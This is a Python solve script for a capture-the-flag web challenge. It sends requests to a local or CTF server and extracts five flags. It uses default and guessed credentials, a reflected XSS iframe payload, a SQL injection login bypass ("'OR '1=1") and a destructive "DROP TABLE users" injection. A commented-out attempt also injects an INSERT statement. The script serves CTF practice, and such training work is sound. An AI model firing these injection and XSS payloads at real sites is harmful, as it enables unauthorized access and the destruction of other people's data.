#!/usr/bin/env python3
import requests
import re

def exploit():
    url = "http://127.0.0.1:5000"
    # url = "https://ctf.bbordes.fr"

    print("flag1:")
    req1 = requests.post(url + '/login', data = {'uname': 'admin', 'psw': "admin"})
    # print(req1.text)
    print(re.findall(r'flag\{.+\}', req1.text)[0])

    print("\nflag2:")
    s = requests.Session()
    req2 = s.post(url + '/login', data = {'uname': 'user1', 'psw': "iloveyou!"})
    print(re.findall(r'flag\{.+\}', req2.text)[0])

    print("\nflag3:")
    req3 = s.get(url + '/profile?profile=<iframe src="javascript:alert(`xss`)"></iframe>')
    print(re.findall(r'(?<=>)flag\{.+\}', req3.text)[0])

    print("\nflag4:")
    req4 = requests.post(url + '/login', data = {'uname': '1', 'psw': "'OR '1=1"})
    print(re.findall(r'flag\{.+\}', req4.text)[0])

    print("\nflag5:")
    req5 = requests.post(url + '/login', data = {'uname': '1', 'psw': "';DROP TABLE 'users"})
    print(re.findall(r'flag\{.+\}', req5.text)[0])

    # print("\nflag6:")
    # requests.post(url + '/login', data = {'uname': '1', 'psw': "';INSERT INTO users VALUES ((SELECT password FROM users WHERE username=user2 LIMIT 1), password)--"})
    # req5 = requests.post(url + '/login', data = {'uname': '1', 'psw': "'OR 1=1 AND password='password"})
    # print(req5.text)
    # print(re.findall(r'flag\{.+\}', req5.text)[0])

if __name__ == "__main__":
    exploit()